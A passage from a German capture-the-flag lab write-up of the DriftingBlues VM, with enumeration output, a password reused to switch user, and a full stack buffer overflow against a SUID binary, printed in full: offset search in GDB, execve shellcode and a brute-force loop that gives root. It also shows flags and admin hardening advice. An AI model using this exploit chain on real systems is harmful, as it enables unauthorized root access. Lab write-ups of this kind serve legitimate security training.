+-rw-r--r--  1 root root 1191 Jan 29  2014 footer.php
+-rw-r--r--  1 root root 1653 Nov 15  2009 header.php
+drwxr-xr-x  4 root root 4096 May  9  2021 images
+drwxrwxrwx  3 root root 4096 May  9  2021 include <!-- World-writeable! -->
+-rw-r--r--  1 root root 6409 Mar 10  2014 index.php
+drwxr-xr-x  2 root root 4096 May  9  2021 js
+drwxr-xr-x  2 root root 4096 May  9  2021 license
+drwxr-xr-x  2 root root 4096 May  9  2021 mails
+drwxr-xr-x  2 root root 4096 May  9  2021 page
+-rw-r--r--  1 root root 1728 Feb  3  2014 rss.xml
+drwxr-xr-x  4 root root 4096 May  9  2021 styles
+drwxr-xr-x  8 root root 4096 May  9  2021 wysiwyg
+                    </pre>
+                     <div class="prompt" style="color: #ffffff;">www-data@debian:/var/www/html$ <span class="command">sudo -l</span></div>
+                     <pre>bash: sudo: command not found</pre>
+                    <div class="prompt" style="color: #ffffff;">www-data@debian:/var/www/html$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
+129861   40 -rwsr-xr-x   1 root     root        38868 May 17  2017 /bin/su
+129837   36 -rwsr-xr-x   1 root     root        34684 Mar 29  2015 /bin/mount
+129838   28 -rwsr-xr-x   1 root     root        26344 Mar 29  2015 /bin/umount
+81   96 -rwsr-xr-x   1 root     root        96760 Oct 19  2019 /sbin/mount.nfs
+271756   96 -rwsr-sr-x   1 root     mail        96192 Nov 18  2017 /usr/bin/procmail
+271097   52 -rwsr-sr-x   1 daemon   daemon      50644 Sep 30  2014 /usr/bin/at
+259682   52 -rwsr-xr-x   1 root     root        53112 May 17  2017 /usr/bin/passwd
+263621   40 -rwsr-xr-x   1 root     root        38740 May 17  2017 /usr/bin/newgrp
+259678   52 -rwsr-xr-x   1 root     root        52344 May 17  2017 /usr/bin/chfn
+259679   44 -rwsr-xr-x   1 root     root        43576 May 17  2017 /usr/bin/chsh
+259681   80 -rwsr-xr-x   1 root     root        78072 May 17  2017 /usr/bin/gpasswd
+271194 1064 -rwsr-xr-x   1 root     root      1089396 May 16  2020 /usr/sbin/exim4
+266623   12 -rwsr-xr-x   1 root     root         9468 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+271730  552 -rwsr-xr-x   1 root     root       562536 Mar 25  2019 /usr/lib/openssh/ssh-keysign
+272875  352 -rwsr-xr--   1 root     messagebus   358576 Jun  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+                    </pre>
+                     <div class="prompt" style="color: #ffffff;">www-data@debian:/var/www/html$ <span class="command">ls /home</span></div>
+                     <pre>clapton</pre>
+                     <div class="prompt" style="color: #ffffff;">www-data@debian:/tmp$ <span class="command">ss -tlpna</span></div>
+                     <pre>
+State      Recv-Q Send-Q        Local Address:Port          Peer Address:Port
+LISTEN     0      20                127.0.0.1:25                       *:*
+LISTEN     0      128               127.0.0.1:3306                     *:*
+LISTEN     0      128                       *:47756                    *:*
+LISTEN     0      128                       *:111                      *:*
+ESTAB      0      2             192.168.2.131:60378        192.168.2.130:4444   users:(("python",pid=1143,fd=1),("python",pid=1143,fd=0),("bash",pid=1137,fd=1),("bash",pid=1137,fd=0))
+LISTEN     0      20                     [::1]:25                    [::]:*
+LISTEN     0      128                      :::47875                   :::*
+LISTEN     0      128                      :::111                     :::*
+LISTEN     0      128                      :::80                      :::*
+CLOSE-WAIT 1      0      ffff:192.168.2.131:80    ffff:192.168.2.130:35106
+                    </pre>
+                    <pre>
+# Code-Analyse (Auszüge aus verschiedenen Dateien)
+# index.php:
+<?php include_once 'header.php'; ?>
+
+
+if (!file_exists("include/base.inc.php")) {
+header("location: install.php");
+// [...]
+require_once("include/base.inc.php");
+require_once("include/connection.php");
+// [...]
+if($site_style == "admin"){
+include_once("admin/home.php");
+}else{
+include_once("page/posts.php");
+}
+
+<?php include_once 'footer.php'; ?>
+
+
+# include/base.inc.php:
+//------------------------------------------------------------------------------
+require_once("shared.inc.php");
+require_once("settings.inc.php");
+require_once("functions.inc.php");
+
+//------------------------------------------------------------------------------
+// check and set token
+$_SESSION["token"] = md5(uniqid(rand(), true));
+
+//------------------------------------------------------------------------------
+// Save this order of loaded classes
+require_once("classes/Session.class.php");
+// [...] (Viele Klassen)
+require_once("classes/RSSFeed.class.php");
+
+                    </pre>
+                     <div class="prompt" style="color: #ffffff;">www-data@debian:/var/www/html$ <span class="command">grep -i 'pass\|user'  include/base.inc.php</span></div>
+                     <pre>
+			define('DATABASE_USERNAME', 'clapton');	// User name for access to database
+			define('DATABASE_PASSWORD', '<span class="password">yaraklitepe</span>');	// Password for access to database
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `su clapton` wird verwendet, um zum Benutzerkonto `clapton` zu wechseln. Das zuvor gefundene Passwort `<span class="password">yaraklitepe</span>` wird eingegeben.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Privilege Escalation zum Benutzer `clapton` war erfolgreich! Wir haben nun eine Shell mit den Rechten dieses Benutzers. Dies bestätigt, dass das gefundene Datenbankpasswort auch das Login-Passwort für den Benutzer `clapton` ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Erkunde das Home-Verzeichnis von `clapton`. Suche nach Benutzer-Flags, interessanten Dateien, Skripten oder weiteren Hinweisen für die Eskalation zu `root`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Verwenden Sie niemals dasselbe Passwort für Datenbanken und Benutzer-Logins. Erzwingen Sie starke, eindeutige Passwörter für alle Konten. Überprüfen Sie regelmäßig die Berechtigungen und Passwörter von Dienstkonten.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt" style="color: #ffffff;">www-data@debian:/var/www/html$ <span class="command">su clapton</span></div>
+                    <pre>Password: <span class="password">yaraklitepe</span></pre> <!-- Passwort eingegeben -->
+                    <div class="prompt" style="color: #ffffff;">clapton@debian:/var/www/html$ <span class="command"> </span></div> <!-- Prompt zeigt nun clapton -->
+                </div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation-root">
+             <h2>Privilege Escalation (zu root)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Im Home-Verzeichnis von `clapton` werden die Dateien untersucht.
+                *   `ls`: Zeigt die Dateien `input`, `note.txt` und `user.txt`.
+                *   `cat user.txt`: Gibt das User-Flag aus.
+                *   `cat note.txt`: Enthält einen Hinweis auf einen Buffer Overflow in der Datei `input` als nächsten Schritt und Links zu Ressourcen über 32-Bit-Buffer-Overflows.
+                *   `find / -perm -004000 -o -perm -002000 -type f 2>/dev/null`: Sucht erneut nach SUID- (4000) und SGID- (2000) Dateien. Die Option `-o` bedeutet ODER.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das User-Flag `<span class="password">F569AA95FAFF65E7A290AB9ED031E04F</span>` wurde gefunden. Die `note.txt` gibt einen klaren Hinweis auf die Methode zur Root-Eskalation: ein Buffer Overflow in der lokalen Datei `/home/clapton/input`. Die erneute Suche nach SUID/SGID-Dateien ist wichtig, um alle Optionen zu prüfen. Sie listet viele Standarddateien auf, aber die wichtigste Erkenntnis hier ist, dass `/home/clapton/input` SUID `root` ist (oder SGID `root`, was hier zum gleichen Ergebnis führen würde, wenn es Root-Rechte gibt).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Analysiere die Datei `/home/clapton/input` auf die Buffer-Overflow-Schwachstelle. Da es sich um eine 32-Bit-Anwendung zu handeln scheint (basierend auf den Links in `note.txt`), verwende Tools wie GDB (GNU Debugger), um den Offset zum Überschreiben des Instruction Pointers (EIP) zu finden und Shellcode zu entwickeln/platzieren. Da ASLR (Address Space Layout Randomization) wahrscheinlich aktiviert ist (siehe spätere Prüfung), wird ein Brute-Force-Ansatz oder eine Technik zur Umgehung von ASLR (wie ROP - Return Oriented Programming) benötigt.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Entfernen Sie das SUID/SGID-Bit von benutzerdefinierten Programmen wie `/home/clapton/input` (`chmod u-s /home/clapton/input`). Solche Berechtigungen sollten nur für absolut notwendige Systembinaries vergeben werden und diese sollten sorgfältig geprüft und gehärtet sein. Kompilieren Sie Anwendungen mit Schutzmechanismen wie Stack Canaries, ASLR und NX-Bit (No-Execute). Überwachen Sie die Ausführung von SUID/SGID-Dateien.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt" style="color: #ffffff;">clapton@debian:/var/www/html$ <span class="command">cd</span></div>
+                    <div class="prompt" style="color: #ffffff;">clapton@debian:~$ <span class="command">ls</span></div>
+                    <pre>
+input  note.txt  user.txt
+                    </pre>
+                    <div class="prompt" style="color: #ffffff;">clapton@debian:~$ <span class="command">cat user.txt</span></div>
+                    <pre><span class="password">F569AA95FAFF65E7A290AB9ED031E04F</span></pre>
+                    <div class="prompt" style="color: #ffffff;">clapton@debian:~$ <span class="command">cat note.txt</span></div>
+                    <pre>
+buffer overflow is the way. ( ͡° ͜ʖ ͡°)
+
+if you're new on 32bit bof then check these:
+
+https://www.tenouk.com/Bufferoverflowc/Bufferoverflow6.html
+https://samsclass.info/127/proj/lbuf1.htm
+                    </pre>
+                    <div class="prompt" style="color: #ffffff;">clapton@debian:~$ <span class="command">find / -perm -004000 -o -perm -002000 -type f 2>/dev/null</span></div>
+                    <pre>
+/bin/su
+/bin/mount
+/bin/umount
+/sbin/mount.nfs
+/sbin/unix_chkpwd
+/usr/bin/procmail
+/usr/bin/at
+/usr/bin/crontab
+/usr/bin/wall
+/usr/bin/mutt_dotlock
+/usr/bin/passwd
+/usr/bin/ssh-agent
+/usr/bin/newgrp
+/usr/bin/dotlockfile
+/usr/bin/expiry
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/chage
+/usr/bin/lockfile
+/usr/bin/gpasswd
+/usr/bin/bsd-write
+/usr/bin/mlocate
+/usr/sbin/exim4
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/home/clapton/input  <!-- SUID/SGID Datei im Home-Verzeichnis! -->
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die `input`-Datei wird zur Analyse auf den Angreifer-Rechner heruntergeladen (hier mit `wget` von einem temporären Python-Server auf Port 9000 auf dem Zielsystem - der Server-Start ist nicht im Text gezeigt, aber impliziert). Anschließend wird GDB (GNU Debugger) verwendet, um das Programm zu analysieren und den Buffer Overflow auszunutzen.
+                1.  **Download:** `wget http://192.168.2.131:9000/input` holt die Datei.
+                2.  **GDB Start:** `gdb ./input` startet den Debugger.
+                3.  **Disassemble Main:** `disass main` zeigt den Assembler-Code der `main`-Funktion. Man sieht einen Aufruf von `strcpy` (`call 0x8048320 strcpy@plt` bei `<+70>`), was eine häufige Quelle für Buffer Overflows ist, da `strcpy` die Länge der Eingabe nicht prüft. Der Puffer befindet sich bei `lea 0x11(%esp),%eax`, was auf einen lokalen Puffer auf dem Stack hindeutet. Der Puffer scheint 0xb0 - 0x11 = 0x9F (159 Bytes) groß zu sein, aber die genaue Größe bis zum Return Pointer (EIP) muss ermittelt werden.
+                4.  **Pattern Creation:** `pattern_create.rb -l 200` (Metasploit-Tool) erzeugt ein eindeutiges Muster von 200 Zeichen, um den genauen Offset zum Überschreiben von EIP zu finden.
+                5.  **Run with Pattern:** `run Aa0...Ag5` führt das Programm in GDB mit dem Muster als Argument aus.
+                6.  **Crash & EIP:** Das Programm stürzt mit einem Segmentation Fault ab. Der Instruction Pointer (EIP) hat den Wert `0x41376641`.
+                7.  **ASLR Check:** Auf dem Zielsystem wird `cat /proc/sys/kernel/randomize_va_space` ausgeführt. Der Wert `2` bedeutet, dass ASLR (Address Space Layout Randomization) vollständig aktiviert ist (Stack, Heap, Libs etc. werden randomisiert). Dies erschwert das Finden einer festen Rücksprungadresse.
+                8.  **Offset Calculation:** `pattern_offset.rb -l 200 -q 41376641` (Metasploit-Tool) berechnet den Offset anhand des EIP-Werts. Das Ergebnis ist 171 Bytes. Das bedeutet, nach 171 Bytes im Input wird der EIP überschrieben.
+                9.  **EIP Overwrite Test:** `r $(python -c 'print("A" * 171 + "B" * 4 + "\x90" * 64 )')` testet das Überschreiben. `A`*171 füllt den Puffer, `B`*4 überschreibt EIP, `\x90`*64 ist ein NOP-Sled (No Operation). Der Crash bei `0x42424242` (ASCII für 'BBBB') bestätigt den Offset.
+                10. **Stack Address Leakage (Versuch):** `x/s $esp` zeigt den Inhalt des Stacks (ESP zeigt auf die Daten nach dem überschriebenen EIP). Hier befindet sich der NOP-Sled (`\x90`). Die Adresse `0xffffd300` wird notiert. Wegen ASLR ist diese Adresse nicht bei jedem Lauf gleich.
+                11. **Exploit Payload:** Der finale Payload wird konstruiert:
+                    *   `"A" * 171`: Füllt den Puffer bis EIP.
+                    *   `"\xb0\x76\x8e\xbf"`: Die (vermutete/gefundene) Rücksprungadresse (Return Address). **WICHTIG:** Diese Adresse muss auf den NOP-Sled oder den Shellcode auf dem Stack zeigen. Da ASLR aktiv ist, ist dies die Schwachstelle des Exploits. Die Adresse `0xbf8e76b0` (Little Endian: `\xb0\x76\x8e\xbf`) wurde vermutlich durch wiederholte Versuche oder eine Schwäche in der ASLR-Implementierung des alten Systems gefunden/erraten.
+                    *   `"\x90" * 1000`: Ein großer NOP-Sled, um die Wahrscheinlichkeit zu erhöhen, dass die Rücksprungadresse hier landet.
+                    *   `"\x31\xc9...\xcd\x80"`: Der eigentliche Shellcode, der eine Shell startet (`/bin/sh` oder ähnlich). Dies ist ein Standard-Shellcode für Linux/x86 (`execve("/bin/sh", ...)`)
+                12. **Brute Force Execution:** `for i in {1..10000}; do (./input $(python -c '...payload...')); done` führt das Programm in einer Schleife 10.000 Mal mit dem Payload aus. Wegen ASLR funktioniert der Exploit nur, wenn die erratene Rücksprungadresse zufällig auf den NOP-Sled/Shellcode zeigt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Analyse mit GDB war erfolgreich bei der Identifizierung der `strcpy`-Schwachstelle und des Offsets (171). Die größte Hürde ist ASLR. Der gewählte Ansatz ist ein Brute-Force der Rücksprungadresse. Nach mehreren Segmentation Faults (fehlgeschlagenen Versuchen) funktioniert der Exploit schließlich! Die Befehle `id`, `pwd`, `cd /root`, `ls`, `cat root.txt` werden erfolgreich ausgeführt, und zwar mit `euid=0(root)` (Effective User ID = root). Dies bestätigt die erfolgreiche Privilege Escalation durch den Buffer Overflow. Das Root-Flag `<span class="password">04D4C1BEC659F1AA15B7AE731CEEDD65</span>` wird gefunden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Der Brute-Force-Ansatz war erfolgreich, ist aber unzuverlässig. In realen Szenarien wären Techniken wie Return-to-libc, ROP (Return Oriented Programming) oder das Ausnutzen von Info-Leaks zur Umgehung von ASLR stabiler. Der Root-Zugriff ist erreicht, das Ziel ist erfüllt.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Kompilieren Sie Anwendungen immer mit Schutzmechanismen (Stack Canaries `-fstack-protector-all`, ASLR `-pie -fPIE`, NX-Bit). Entfernen Sie SUID von unsicheren, selbst entwickelten Anwendungen. Halten Sie das Betriebssystem und die Compiler auf dem neuesten Stand. Überwachen Sie Systemabstürze (Segfaults), da diese auf Exploitation-Versuche hindeuten können. Verwenden Sie Intrusion Detection Systeme, die Shellcode-Muster erkennen können.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+# Annahme: Python-Server auf Ziel gestartet (z.B. python -m SimpleHTTPServer 9000)
+# --- Auf Angreifer-Rechner ---
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.131:9000/input</span></div>
+                    <pre>
+--2023-04-18 15:21:13--  http://192.168.2.131:9000/input
+Connecting to 192.168.2.131:9000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5150 (5.0K) [application/octet-stream]
+Saving to: ‘input’
+
+input               100%[===================>]   5.03K  --.-KB/s    in 0s
+
+2023-04-18 15:21:13 (1.06 GB/s) - ‘input’ saved [5150/5150]
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gdb ./input</span></div>
+                    <pre>
+GNU gdb (Debian 13.1-2) 13.1
+Copyright (C) 2023 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<https://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+Reading symbols from ./input...(no debugging symbols found)...done.
+                    </pre>
+                    <div class="prompt" style="color: #ffffff;">(gdb) <span class="command">disass main</span></div>
+                    <pre>
+Dump of assembler code for function main:
+   0x0804845d <+0>:	push   %ebp
+   0x0804845e <+1>:	mov    %esp,%ebp
+   0x08048460 <+3>:	and    $0xfffffff0,%esp
+   0x08048463 <+6>:	sub    $0xb0,%esp
+   0x08048469 <+12>:	cmpl   $0x1,0x8(%ebp)
+   0x0804846d <+16>:	jg     0x8048490 <main+51>
+   0x0804846f <+18>:	mov    0xc(%ebp),%eax
+   0x08048472 <+21>:	mov    (%eax),%eax
+   0x08048474 <+23>:	mov    %eax,0x4(%esp)
+   0x08048478 <+27>:	movl   $0x8048540,(%esp)
+   0x0804847f <+34>:	call   0x8048310 <printf@plt>
+   0x08048484 <+39>:	movl   $0x0,(%esp)
+   0x0804848b <+46>:	call   0x8048340 <exit@plt>
+   0x08048490 <+51>:	mov    0xc(%ebp),%eax
+   0x08048493 <+54>:	add    $0x4,%eax
+   0x08048496 <+57>:	mov    (%eax),%eax
+   0x08048498 <+59>:	mov    %eax,0x4(%esp)
+   0x0804849c <+63>:	lea    0x11(%esp),%eax  ; Pufferadresse
+   0x080484a0 <+67>:	mov    %eax,(%esp)
+   0x080484a3 <+70>:	call   0x8048320 <strcpy@plt> ; Schwachstelle!
+   0x080484a8 <+75>:	mov    $0x0,%eax
+   0x080484ad <+80>:	leave
+   0x080484ae <+81>:	ret
+End of assembler dump.
+                    </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200</span></div>
+                    <pre>
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+                    </pre>
+                     <div class="prompt" style="color: #ffffff;">(gdb) <span class="command">run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</span></div>
+                     <pre>
+Starting program: /root/input Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41376641 in ?? ()
+                    </pre>
+                    <div class="prompt" style="color: #ffffff;">(gdb) <span class="command">q</span></div>
+                    <pre>A debugging session is active.
+
+	Inferior 1 [process 1234] will be killed.
+
+Quit anyway? (y or n) y</pre>
+
+                    <pre>
+# --- Auf dem Zielsystem (clapton Shell) ---
+                    </pre>
+                    <div class="prompt" style="color: #ffffff;">clapton@debian:~$ <span class="command">cat /proc/sys/kernel/randomize_va_space</span></div>
+                    <pre>2</pre>
+
+                    <pre>
+# --- Zurück auf Angreifer-Rechner ---
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 200 -q 41376641</span></div>
+                    <pre>[*] Exact match at offset 171</pre>
+
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gdb -q ./input</span></div>
+                     <pre>Reading symbols from ./input...(no debugging symbols found)...done.</pre>
+                     <div class="prompt" style="color: #ffffff;">(gdb) <span class="command">r $(python -c 'print("A" * 171 + "B" * 4 + "\x90" * 64 )')</span></div>
+                     <pre>
+Starting program: /root/input $(python -c 'print("A" * 171 + "B" * 4 + "\x90" * 64 )')
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+                    </pre>
+                     <div class="prompt" style="color: #ffffff;">(gdb) <span class="command">x/s $esp</span></div>
+                     <pre>0xffffd300:	'\220' <repeats 64 times></pre> <!-- Adresse variiert wegen ASLR -->
+                     <div class="prompt" style="color: #ffffff;">(gdb) <span class="command">q</span></div>
+                     <pre>A debugging session is active.
+
+	Inferior 1 [process 5678] will be killed.
+
+Quit anyway? (y or n) y</pre>
+
+                </div>
+            </div>
+        </section>
+
+        <section id="proof-of-concept">
+            <h2>Proof of Concept (Root Access via Buffer Overflow)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Da ASLR aktiv ist, wird ein Brute-Force-Ansatz verwendet. Eine Schleife führt das anfällige Programm `/home/clapton/input` wiederholt aus, jedes Mal mit einem speziell konstruierten Argument (Payload).
+                *   `"A" * 171`: Füllt den Puffer bis zum EIP.
+                *   `"\xb0\x76\x8e\xbf"`: Die spekulative Rücksprungadresse (Little Endian), die in den NOP-Sled zeigen soll. Diese Adresse muss durch Ausprobieren oder Analyse der Speicherlayout-Schwankungen gefunden werden.
+                *   `"\x90" * 1000`: Der NOP-Sled. Landet die Ausführung hier, rutscht sie zum Shellcode weiter.
+                *   `"\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80"`: Der Shellcode für `execve("/bin/sh", ...)` unter Linux/x86.
+                Die Schleife (`for i in {1..10000}; do ...; done`) versucht dies bis zu 10.000 Mal.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nach zahlreichen `Segmentation fault`-Meldungen (Fehlschläge, bei denen die Rücksprungadresse nicht im NOP-Sled landete), war die Attacke erfolgreich. Der Shellcode wurde ausgeführt, und wir erhielten eine Shell. Der `id`-Befehl zeigt `euid=0(root)`, was den Root-Zugriff bestätigt. Die nachfolgenden Befehle (`pwd`, `cd /root`, `ls`, `cat root.txt`) demonstrieren die Root-Rechte und lesen erfolgreich das Root-Flag.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Der Proof of Concept ist erbracht. Root-Zugriff wurde durch Ausnutzung eines klassischen Stack Buffer Overflows trotz ASLR (mittels Brute-Force) erreicht. Dokumentieren Sie den Exploit-Prozess und die Flags.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Die dringendste Maßnahme ist das Entfernen des SUID-Bits von `/home/clapton/input`. Implementieren Sie Compiler-Schutzmaßnahmen (`-fstack-protector-all`, `-pie`, `-fPIE`) für alle Anwendungen, insbesondere solche, die mit erhöhten Rechten laufen oder externe Eingaben verarbeiten. Aktualisieren Sie das System, um von neueren ASLR-Implementierungen und anderen Sicherheitsverbesserungen zu profitieren.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                     <pre>
+# --- Auf dem Zielsystem (clapton Shell) ---
+# Exploit Ausführung mit Brute-Force wegen ASLR
+                    </pre>
+                    <div class="prompt" style="color: #ffffff;">clapton@debian:~$ <span class="command">for i in {1..10000}; do (./input $(python -c 'print("A" * 171 + "\xb0\x76\x8e\xbf" + "\x90" * 1000 + "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80")')); done</span></div>
+                     <pre>
+Segmentation fault
+Segmentation fault
+... (viele Segfaults) ...
+Segmentation fault
+# Erfolgreiche Ausführung startet Shell (kein Prompt mehr von clapton)
+<span class="command">id</span>
+uid=1000(clapton) gid=1000(clapton) euid=0(root) groups=1000(clapton)
+<span class="command">pwd</span>
+/home/clapton
+<span class="command">cd /root</span>
+<span class="command">ls</span>
+root.txt
+<span class="command">cat root.txt</span>
+this is the final of driftingblues series. i hope you've learned something from them.
+
+you can always contact me at vault13_escape_service[at]outlook.com for your questions. (mail language: english/turkish)
+
+your root flag:
+
+<span class="password">04D4C1BEC659F1AA15B7AE731CEEDD65</span>
+
+# Shell beendet sich oft nach dem ersten Befehl oder bleibt hängen, daher ggf. Exploit erneut starten für weitere Befehle
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+       <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat user.txt</div>
+                    <div class="flag-value"><span class="password">F569AA95FAFF65E7A290AB9ED031E04F</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat root.txt</div>
+                    <div class="flag-value"><span class="password">04D4C1BEC659F1AA15B7AE731CEEDD65</span></div>
+                </div>
+            </div>
+        </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 18. April 2023</p> <!-- Extrahiertes Datum aus Nmap Scan -->
+    </footer>
+</body>
+</html>
